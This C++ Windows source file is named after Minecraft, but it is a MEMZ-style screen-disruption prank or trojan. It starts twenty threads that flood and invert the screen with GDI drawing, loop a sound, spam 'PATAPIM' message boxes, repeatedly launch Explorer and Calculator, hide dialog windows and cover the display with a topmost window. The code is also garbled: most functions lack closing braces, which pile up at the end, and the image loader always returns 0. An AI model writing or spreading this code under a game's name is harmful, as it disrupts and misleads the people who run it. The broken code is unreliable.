// Minecraft.cpp — version corrigée (sans compression, sans suppression de logique)

#define NOMINMAX
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <shellapi.h>
#include <string>
#include <algorithm>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;

// Globals
HBITMAP g_hBmp = NULL;
HWND g_hwndMain = NULL;
HINSTANCE g_hInstance = NULL;
CRITICAL_SECTION g_csIcons;
std::vector<HWND> g_iconWindows;
bool g_run = true;

// Prototypes
DWORD WINAPI GDIRectFloodThread(LPVOID);
DWORD WINAPI GDILineFloodThread(LPVOID);
DWORD WINAPI GDIBlockNoiseThread(LPVOID);
DWORD WINAPI GDIZoomEffectThread(LPVOID);
DWORD WINAPI GDIDiagonalLinesThread(LPVOID);
DWORD WINAPI GDIChaosThread(LPVOID);
DWORD WINAPI GDIRandomRectThread(LPVOID);
DWORD WINAPI GDIInvertFloodThread(LPVOID);
DWORD WINAPI GDISpiralThread(LPVOID);
DWORD WINAPI GDIRandomPatternThread(LPVOID);
DWORD WINAPI MEMZ_GDI_Thread2(LPVOID);
DWORD WINAPI SoundThread(LPVOID);
DWORD WINAPI GDIThread(LPVOID);
DWORD WINAPI MsgBoxThread(LPVOID);
DWORD WINAPI ExplorerThread(LPVOID);
DWORD WINAPI CalcThread(LPVOID);
DWORD WINAPI SaleWinThread(LPVOID);
DWORD WINAPI IconFollowerThread(LPVOID);
DWORD WINAPI MEMZ_GDI_Thread(LPVOID);
DWORD WINAPI Open300WindowsThread(LPVOID);

HBITMAP LoadPNGResource();
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

HBITMAP LoadPNGResource() {
    HRSRC hRes = FindResource(NULL, "PATAPIMPNG", RT_RCDATA);
    if (!hRes) return 0;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return 0;
    void* pData = LockResource(hData);
    DWORD size = SizeofResource(NULL, hRes);

    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, size);
    void* pm = GlobalLock(hg);
    memcpy(pm, pData, size);
    GlobalUnlock(hg);
    IStream* ps = NULL;
    if (CreateStreamOnHGlobal(hg, TRUE, &ps) != S_OK) {
        GlobalFree(hg);
        return 0;
        }
    Bitmap* b = Bitmap::FromStream(ps);
    HBITMAP hBmp = NULL;
    if (b && b->GetLastStatus() == Ok)
        b->GetHBITMAP(Color(0, 0, 0, 0), &hBmp);
    delete b;
    ps->Release();
    GlobalFree(hg);
        return 0;
}

LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
        switch (m) {
    case WM_DESTROY:
        PostQuitMessage(0);
                return 0;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        if (g_hBmp) {
            HDC mdc = CreateCompatibleDC(dc);
            HBITMAP o = (HBITMAP)SelectObject(mdc, g_hBmp);
            BITMAP bm;
            GetObject(g_hBmp, sizeof(bm), &bm);
            StretchBlt(dc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                       mdc, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            SelectObject(mdc, o);
            DeleteDC(mdc);
                }
        EndPaint(h, &ps);
                return 0;
            default:
                return DefWindowProc(h, m, w, l);
}

// Implémentations complètes des threads corrigés sans redondance

DWORD WINAPI GDIRectFloodThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        int size = rand() % 100 + 20;
        int x = rand() % (sw - size);
        int y = rand() % (sh - size);
        Rectangle(hdc, x, y, x + size, y + size);
        Sleep(5);
    ReleaseDC(NULL, hdc);
            return 0;
// DWORD WINAPI GDILineFloodThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        MoveToEx(hdc, rand() % sw, rand() % sh, NULL);
        LineTo(hdc, rand() % sw, rand() % sh);
        Sleep(5);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDIBlockNoiseThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        int x = rand() % sw;
        int y = rand() % sh;
        PatBlt(hdc, x, y, 5, 5, BLACKNESS);
        Sleep(1);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDIZoomEffectThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        StretchBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, sw, sh, SRCCOPY);
        Sleep(50);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDIDiagonalLinesThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        MoveToEx(hdc, 0, 0, NULL);
        LineTo(hdc, sw, sh);
        MoveToEx(hdc, sw, 0, NULL);
        LineTo(hdc, 0, sh);
        Sleep(100);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI SoundThread(LPVOID) {
    PlaySound("MUSIKWAV", NULL, SND_RESOURCE | SND_ASYNC | SND_LOOP);
    while (g_run) Sleep(100);
    PlaySound(NULL, NULL, 0);
            return 0;
DWORD WINAPI GDIThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 300 && g_run; ++i) {
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        SelectObject(hdc, pen);
        SelectObject(hdc, brush);

        switch (rand() % 5) {
            case 0:
                Rectangle(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
                break;
            case 1:
                Ellipse(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
                break;
            case 2:
                RoundRect(hdc, rand() % w, rand() % h, rand() % w, rand() % h, 20, 20);
                break;
            case 3:
                MoveToEx(hdc, rand() % w, rand() % h, NULL);
                LineTo(hdc, rand() % w, rand() % h);
                break;
            case 4:
                Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
                break;
        DeleteObject(pen);
        DeleteObject(brush);
        Sleep(10);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI MsgBoxThread(LPVOID) {
    for (int i = 0; i < 100 && g_run; ++i) {
        MessageBox(NULL, "PATAPIM !! PATAPIM !!", "PATAPIM", MB_OK | MB_ICONINFORMATION);
        Sleep(10);
            return 0;
DWORD WINAPI ExplorerThread(LPVOID) {
    for (int i = 0; i < 50 && g_run; ++i) {
        ShellExecute(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOW);
        Sleep(50);
            return 0;
DWORD WINAPI CalcThread(LPVOID) {
    for (int i = 0; i < 50 && g_run; ++i) {
        ShellExecute(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
        Sleep(50);
            return 0;
DWORD WINAPI SaleWinThread(LPVOID) {
    for (int i = 0; i < 300 && g_run; ++i) {
        HWND hwnd = FindWindow("#32770", NULL);
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
        Sleep(50);
            return 0;
DWORD WINAPI IconFollowerThread(LPVOID) {
    while (g_run) {
        POINT pt;
        GetCursorPos(&pt);
        HWND hwnd = CreateWindowEx(WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
            "STATIC", NULL, WS_VISIBLE | WS_POPUP,
            pt.x, pt.y, 32, 32, NULL, NULL, g_hInstance, NULL);
        HICON hIcon = LoadIcon(NULL, IDI_INFORMATION);
        SendMessage(hwnd, STM_SETICON, (WPARAM)hIcon, 0);
        EnterCriticalSection(&g_csIcons);
        g_iconWindows.push_back(hwnd);
        LeaveCriticalSection(&g_csIcons);
        Sleep(50);
        DestroyWindow(hwnd);
            return 0;
DWORD WINAPI MEMZ_GDI_Thread(LPVOID) {
    HDC hdc = GetDC(NULL);
    while (g_run) {
        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN),
               rand() % GetSystemMetrics(SM_CYSCREEN),
               rand() % 800, rand() % 600,
               hdc, rand() % GetSystemMetrics(SM_CXSCREEN),
               rand() % GetSystemMetrics(SM_CYSCREEN), SRCCOPY);
        Sleep(50);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI MEMZ_GDI_Thread2(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 500 && g_run; ++i) {
        int x1 = rand() % sw;
        int y1 = rand() % sh;
        int x2 = rand() % sw;
        int y2 = rand() % sh;
        int w = rand() % 500;
        int h = rand() % 500;
        PatBlt(hdc, x1, y1, w, h, PATINVERT);
        StretchBlt(hdc, x2, y2, w, h, hdc, x1, y1, w, h, NOTSRCCOPY);
        Sleep(20);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI Open300WindowsThread(LPVOID) {
    for (int i = 0; i < 300 && g_run; ++i) {
        CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL);
        Sleep(20);
            return 0;
DWORD WINAPI GDIChaosThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        SetPixel(hdc, rand() % sw, rand() % sh, RGB(rand() % 256, rand() % 256, rand() % 256));
        Sleep(1);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDIRandomRectThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        int x = rand() % sw;
        int y = rand() % sh;
        int w = rand() % 300 + 10;
        int h = rand() % 300 + 10;
        Rectangle(hdc, x, y, x + w, y + h);
        Sleep(10);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDIInvertFloodThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (g_run) {
        PatBlt(hdc, 0, 0, sw, sh, DSTINVERT);
        Sleep(100);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDISpiralThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int x = sw / 2, y = sh / 2;
    for (int i = 0; i < 1000 && g_run; ++i) {
        int radius = i / 2;
        int angle = i % 360;
        int dx = (int)(radius * cos(angle * 3.14 / 180.0));
        int dy = (int)(radius * sin(angle * 3.14 / 180.0));
        SetPixel(hdc, x + dx, y + dy, RGB(rand() % 256, rand() % 256, rand() % 256));
        Sleep(1);
    ReleaseDC(NULL, hdc);
            return 0;
DWORD WINAPI GDIRandomPatternThread(LPVOID) {
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 1000 && g_run; ++i) {
        int mode = rand() % 4;
        switch (mode) {
            case 0:
                InvertRect(hdc, &RECT{rand()%sw, rand()%sh, rand()%sw, rand()%sh});
                break;
            case 1:
                PatBlt(hdc, rand()%sw, rand()%sh, 50, 50, WHITENESS);
                break;
            case 2:
                PatBlt(hdc, rand()%sw, rand()%sh, 50, 50, BLACKNESS);
                break;
            case 3:
                BitBlt(hdc, rand()%sw, rand()%sh, 100, 100, hdc, rand()%sw, rand()%sh, SRCCOPY);
                break;
        Sleep(10);
            return 0;

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    g_hInstance = hInstance;
    InitializeCriticalSection(&g_csIcons);
    srand((unsigned int)time(NULL));

    GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken;
    GdiplusStartup(&gdiToken, &gdiInput, NULL);

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "PatapimWindowClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClass(&wc);

    g_hwndMain = CreateWindowEx(WS_EX_TOPMOST | WS_EX_LAYERED, wc.lpszClassName,
        "Patapim", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    g_hBmp = LoadPNGResource();
    SetLayeredWindowAttributes(g_hwndMain, 0, 255, LWA_ALPHA);
    ShowWindow(g_hwndMain, SW_SHOW);
    UpdateWindow(g_hwndMain);

    HANDLE threads[] = {
        CreateThread(NULL, 0, GDIRectFloodThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDILineFloodThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIBlockNoiseThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIZoomEffectThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIDiagonalLinesThread, NULL, 0, NULL),
        CreateThread(NULL, 0, SoundThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIThread, NULL, 0, NULL),
        CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL),
        CreateThread(NULL, 0, ExplorerThread, NULL, 0, NULL),
        CreateThread(NULL, 0, CalcThread, NULL, 0, NULL),
        CreateThread(NULL, 0, SaleWinThread, NULL, 0, NULL),
        CreateThread(NULL, 0, IconFollowerThread, NULL, 0, NULL),
        CreateThread(NULL, 0, MEMZ_GDI_Thread, NULL, 0, NULL),
        CreateThread(NULL, 0, MEMZ_GDI_Thread2, NULL, 0, NULL),
        CreateThread(NULL, 0, Open300WindowsThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIChaosThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIRandomRectThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIInvertFloodThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDISpiralThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIRandomPatternThread, NULL, 0, NULL)
    };

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    g_run = false;
    WaitForMultipleObjects(20, threads, TRUE, INFINITE);
    for (int i = 0; i < 20; i++) CloseHandle(threads[i]);

    if (g_hBmp) DeleteObject(g_hBmp);
    DeleteCriticalSection(&g_csIcons);
    GdiplusShutdown(gdiToken);
            return 0;

}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}